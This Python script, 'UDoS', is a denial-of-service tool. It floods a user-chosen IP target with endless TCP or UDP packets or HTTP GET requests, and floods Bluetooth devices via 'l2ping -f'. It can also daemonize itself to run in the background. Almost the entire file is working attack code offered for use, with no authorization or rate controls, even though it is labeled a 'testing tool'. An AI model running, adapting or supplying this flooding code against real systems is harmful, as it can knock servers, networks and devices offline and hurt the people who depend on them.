#!/usr/bin/env python

#############################################################################
##                                                                         ##
##  Copyleft by WebNuLL < webnull.www at gmail dot com  >                  ##
##                                                                         ##
## This program is free software; you can redistribute it and/or modify it ##
## under the terms of the GNU General Public License version 3 as          ##
## published by the Free Software Foundation; version 3.                   ##
##                                                                         ##
## This program is distributed in the hope that it will be useful, but     ##
## WITHOUT ANY WARRANTY; without even the implied warranty of              ##
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU       ##
## General Public License for more details.                                ##
##                                                                         ##
#############################################################################

## thanks to Franck TABARY <franck.tab atat gmail thedot com> for daemonize function, but if you are releasing code on GPL
## you cant use "Copyrght" in script

import re
import socket
import getopt
import sys,os,time,random,urllib

if sys.version_info[0] >= 3:
    import http.client as httplib
    from urllib.parse import urlparse
else:
    import httplib
    from urlparse import urlparse



#################################
##### Define some constants #####
#################################

# options
debugMode=False
consoleMode=False
useProtocol="TCP"
target=""
port=80
bluetoothMode = None
bytes_len = 256

########################################################################
##### daemonize: if -d param not specified, daemonize this program #####
########################################################################

def daemonize (stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
    '''This forks the current process into a daemon.
    The stdin, stdout, and stderr arguments are file names that
    will be opened and be used to replace the standard file descriptors
    in sys.stdin, sys.stdout, and sys.stderr.
    These arguments are optional and default to /dev/null.
    Note that stderr is opened unbuffered, so
    if it shares a file with stdout then interleaved output
    may not appear in the order that you expect.
    '''

    # Do first fork.
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)   # Exit first parent.
    except OSError as e:
        sys.stderr.write ("fork #1 failed: (%d) %s\n" % (e.errno, e.strerror) )
        sys.exit(1)

    # Decouple from parent environment.
    os.chdir("/")
    os.umask(0)
    os.setsid()

    # Do second fork.
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)   # Exit second parent.
    except OSError as e:
        sys.stderr.write ("fork #2 failed: (%d) %s\n" % (e.errno, e.strerror) )
        sys.exit(1)

    # Now I am a daemon!

    # Redirect standard file descriptors.
    si = open(stdin, 'r')
    so = open(stdout, 'a+')
    se = open(stderr, 'a+', 0)
    os.dup2(si.fileno(), sys.stdin.fileno())
    os.dup2(so.fileno(), sys.stdout.fileno())
    os.dup2(se.fileno(), sys.stderr.fileno())

############################
##### eth/wlan attacks #####
############################

def http_attack():
    ''' Simple HTTP attacks '''
    requests_sent = 0
    timeouts = 0
    o = urlparse(target)
    print("Starting HTTP GET flood on \""+o.netloc+":"+str(port)+o.path+"\"...")

    try:
        while True:
            try:
                connection = httplib.HTTPConnection(o.netloc+":"+str(port), timeout=2)
                connection.request("GET", o.path)
                requests_sent = requests_sent + 1
            except Exception as err:
               if "timed out" in err:
                   timeouts = timeouts + 1

    except KeyboardInterrupt:
        print("Info: Maked "+str(requests_sent)+" requests.\nTimeouts: "+str(timeouts))

def eth_attack():
    ''' Ethernet/Wireless attack function '''
    global log, target, debugMode, useProtocol, port

    if useProtocol == "HTTP":
        http_attack()
        return

    # number of packets for summary
    packets_sent = 0

    # TCP flood
    if useProtocol == "TCP":
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    else: # UDP flood
        sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) # UDP

    bytes=random._urandom(bytes_len)
    addr=(target,port)

    try:
        sock.connect(addr)
    except socket.error as e:
        print("Error: Cannot connect to destination, "+str(e))
        exit(0)

    sock.settimeout(None)

    try: 
        while True:
           try:
               sock.sendto(bytes,(target,port))
               packets_sent=packets_sent+1
           except socket.error:
               if debugMode == True:
                   print("Reconnecting: ip="+str(target)+", port="+str(port)+", packets_sent="+str(packets_sent)) # propably dropped by firewall

               try:
                   sock.close()
                   sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                   sock.connect(addr)
               except socket.error:
                   continue

    except KeyboardInterrupt:
        print("Info: Sent "+str(packets_sent)+" packets.")

def bt_attack():
    global target, port

    # initialize socket
    #sock=bluetooth.BluetoothSocket( bluetooth.RFCOMM )

    # number of packets for summary
    #packets_sent = 0

    # connect
    #try:
    #    try:
    #        sock.connect((target, port))
    #    except bluetooth.btcommon.BluetoothError as (bterror):
    #        print "Error: Cannot connect using RFC to "+target+" on port "+str(port)+", "+str(bterror[0])+""
    #        exit(0)

     
    #    while True:
    #        packets_sent=packets_sent+1

            # send random data
    #        sock.send(str(random._urandom(bytes_len)))
    #except KeyboardInterrupt:
    #    print "Info: Sent "+str(packets_sent)+" packets."
    try:
        if not os.path.isfile("/usr/bin/l2ping"):
            print("Cannot find /usr/bin/l2ping, please install l2ping to use this feature.")
            sys.exit(0)

        sto = os.system ("/usr/bin/l2ping -f "+target+" -s "+str(bytes_len))
    except KeyboardInterrupt:
        sys.exit(0)
    

##########################################
##### printUsage: display short help #####
##########################################

def printUsage():
    ''' Prints program usage '''

    print("UDoS for GNU/Linux - Universal DoS and DDoS testing tool")
    print("Supports attacks: TCP/UDP flood, HTTP flood")
    print("")
    print("Usage: udos [option] [long GNU option]")
    print("")
    print("Valid options:")
    print("  -h, --help             : display this help")
    print("  -f, --fork             : fork to background")
    print("  -d, --debug            : switch to debug log level")
    print("  -s, --socket           : use TCP or UDP connection over ethernet/wireless, default TCP, available TCP, UDP, RFC (bluetooth), HTTP over ethernet")
    print("  -t, --target           : target adress (bluetooth mac or ip adress over ethernet/wireless)")
    print("  -p, --port             : destination port")
    print("  -b, --bytes            : number of bytes to send in one packet")
    print("")

try:
    opts, args = getopt.getopt(sys.argv[1:], 'hcds:b:t:p:b:', ['console','debug','help', 'socket=', 'target=', 'port=', 'bytes='])
except getopt.error as msg:
    print(msg)
    print('UDoS for GNU/Linux - Universal DoS and DDoS testing tool')
    sys.exit(2)

# process options
for o, a in opts:
    if o in ('-h', '--help'):
        printUsage()
        exit(2)
    if o in ('-d', '--debug'):
        debugMode=True
    if o in ('-f', '--fork'):
        daemonize()
    if o in ('-t', '--target'):
        target = a
    if o in ('-p', '--port'):
        if debugMode == True:
            print("Info: Using port "+str(a))
        try:
            port = int(a)
        except ValueError:
            print("Error: Port value is not an integer")
            exit(0)

    if o in ('-b', '--bytes'):
        if debugMode == True:
            print("Info: Will be sending "+str(a)+"b packets")
        try:
            bytes_len = int(a)
        except ValueError:
            print("Error: Bytes length must be numeratic")
            exit(0)

    if o in ('-s', '--socket'):
        bluetoothMode = False

        if a == "tcp" or a == "TCP":
            useProtocol = "TCP"
        elif a == "udp" or a == "UDP":
            useProtocol = "UDP"
        elif a == "RFC" or a == "rfc" or a == "BT" or a == "bt" or a == "bluetooth" or a == "BLUETOOTH":
            useProtocol = "RFC"
            bluetoothMode = True
        elif a == "http" or a == "www" or a == "HTTP" or a == "WWW":
            useProtocol = "HTTP"

        if debugMode == True:
            print("Info: Socket type is "+useProtocol)

if bluetoothMode == False:
    eth_attack()
elif bluetoothMode == None:
    print('UDoS for GNU/Linux - Universal DoS and DDoS testing tool, use --help for usage')
else:
    #import bluetooth
    bt_attack()

